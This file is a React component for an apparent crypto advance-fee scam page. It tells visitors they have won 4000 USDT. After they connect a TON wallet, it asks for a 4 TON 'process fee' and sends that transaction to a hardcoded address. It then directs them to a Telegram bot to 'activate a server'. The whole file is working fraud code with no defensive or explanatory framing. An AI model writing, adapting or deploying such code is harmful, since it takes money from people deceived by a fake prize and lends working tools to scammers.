import { useState, useEffect } from "react";
import { TonConnectButton, useTonConnectUI, useTonAddress } from "@tonconnect/ui-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { TONIcon } from "@/components/TONIcon";
import { Wallet, ArrowRight, ShieldCheck, ExternalLink } from "lucide-react";
import { useRecordVisit } from "@/hooks/use-visits";
import boltImg from "@assets/photo_5841469321920580997_w_1772752705315.jpg";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const userAddress = useTonAddress();
  const { mutate: recordVisit } = useRecordVisit();
  
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [isSuccessOpen, setIsSuccessOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    recordVisit({});
  }, [recordVisit]);

  const handleWithdrawClick = () => {
    if (!userAddress) {
      const tonConnectButton = document.querySelector('button[class*="ton-connect-button"]');
      if (tonConnectButton instanceof HTMLElement) {
        tonConnectButton.click();
      } else {
        const trigger = document.getElementById('ton-connect-trigger');
        const button = trigger?.querySelector('button');
        if (button instanceof HTMLElement) {
          button.click();
        }
      }
      return;
    }
    setIsWithdrawOpen(true);
  };

  const handlePayment = async () => {
    try {
      setIsProcessing(true);
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: "UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb",
            amount: "4000000000",
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      setIsWithdrawOpen(false);
      setIsSuccessOpen(true);
    } catch (error) {
      console.error("Transaction failed:", error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden bg-[#000000]">
      <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-blue-900/10 via-transparent to-transparent pointer-events-none" />

      <main className="flex-1 flex flex-col items-center justify-center p-4 z-10">
        <div className="w-full max-w-lg">
          <div className="bg-[#0f0f0f] border border-white/10 rounded-[2.5rem] p-8 md:p-12 text-center relative overflow-hidden shadow-[0_0_50px_-12px_rgba(255,255,255,0.05)]">
            <div className="flex justify-end mb-8">
              <div className="scale-90 origin-right">
                <TonConnectButton />
              </div>
            </div>
            
            <div className="flex justify-center mb-10">
              <div className="relative group">
                <div className="absolute -inset-1 bg-gradient-to-r from-blue-500 to-emerald-500 rounded-[2rem] blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
                <div className="relative rounded-[2rem] overflow-hidden border border-white/10 bg-black">
                  <img src={boltImg} alt="Prize" className="w-full h-auto max-h-[280px] object-cover" />
                </div>
              </div>
            </div>

            <div className="space-y-4 mb-12">
              <h1 className="text-5xl md:text-6xl font-black text-white tracking-tighter italic uppercase">
                Victory!<br/>
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">4000 USDT</span>
              </h1>
              <p className="text-gray-500 text-lg font-medium tracking-tight">
                Your reward is waiting. Transfer to your wallet now.
              </p>
            </div>

            <button
              onClick={handleWithdrawClick}
              className="w-full bg-white hover:bg-gray-100 text-black font-black py-6 rounded-2xl text-2xl transition-all active:scale-[0.97] shadow-[0_0_30px_rgba(255,255,255,0.1)] uppercase tracking-widest"
            >
              Withdraw Now
            </button>
            
            {!userAddress && (
              <div className="mt-6 flex items-center justify-center gap-2 text-gray-600">
                <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
                <p className="text-xs font-bold uppercase tracking-widest">Connect Wallet to claim</p>
              </div>
            )}
          </div>
        </div>
      </main>

      <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
        <DialogContent className="bg-[#0f0f0f] border-white/10 sm:max-w-md p-0 overflow-hidden rounded-[2rem]">
          <div className="p-10">
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center border border-blue-500/20">
                <Wallet className="w-8 h-8 text-blue-400" />
              </div>
            </div>
            <h2 className="text-3xl text-center font-black text-white mb-3 uppercase italic">Process Fee</h2>
            <p className="text-center text-gray-500 mb-10 text-lg leading-relaxed">
              Complete the secure verification to release your <span className="text-white font-bold">4000 USDT</span> reward.
            </p>
            
            <div className="bg-white/[0.03] rounded-2xl p-8 border border-white/5 mb-10 flex items-center justify-between">
              <span className="text-gray-500 font-bold uppercase tracking-widest text-sm">Amount Due</span>
              <div className="text-right">
                <span className="text-4xl font-black text-white italic">4.0</span>
                <span className="ml-2 text-blue-400 font-black italic">TON</span>
              </div>
            </div>

            <div className="space-y-4">
              <Button 
                onClick={handlePayment} 
                disabled={isProcessing}
                className="w-full bg-white text-black hover:bg-gray-100 font-black text-xl h-20 rounded-2xl transition-all shadow-[0_0_40px_rgba(255,255,255,0.05)] uppercase tracking-widest"
              >
                {isProcessing ? "Processing..." : "Confirm & Pay"}
              </Button>
              <Button 
                variant="ghost" 
                onClick={() => setIsWithdrawOpen(false)}
                className="w-full text-gray-600 hover:text-white font-bold uppercase tracking-widest text-xs"
              >
                Go Back
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isSuccessOpen} onOpenChange={setIsSuccessOpen}>
        <DialogContent className="bg-[#0f0f0f] border-white/10 sm:max-w-md p-0 overflow-hidden rounded-[2rem]">
          <div className="p-10 text-center">
            <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-500/20">
              <ShieldCheck className="w-12 h-12 text-green-500" />
            </div>
            <h2 className="text-3xl font-black text-white mb-4 uppercase italic">Verified!</h2>
            <p className="text-gray-500 text-lg mb-10 leading-relaxed">
              Final step: Activate your server to complete the transfer to your wallet.
            </p>
            
            <a 
              href="https://t.me/Boltminingbot/App" 
              target="_blank" 
              rel="noopener noreferrer"
              className="w-full flex items-center justify-center bg-[#0088cc] hover:bg-[#0077b5] text-white text-xl font-black h-20 rounded-2xl transition-all shadow-[0_0_40px_rgba(0,136,204,0.2)] uppercase tracking-widest"
            >
              Activate Server
            </a>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}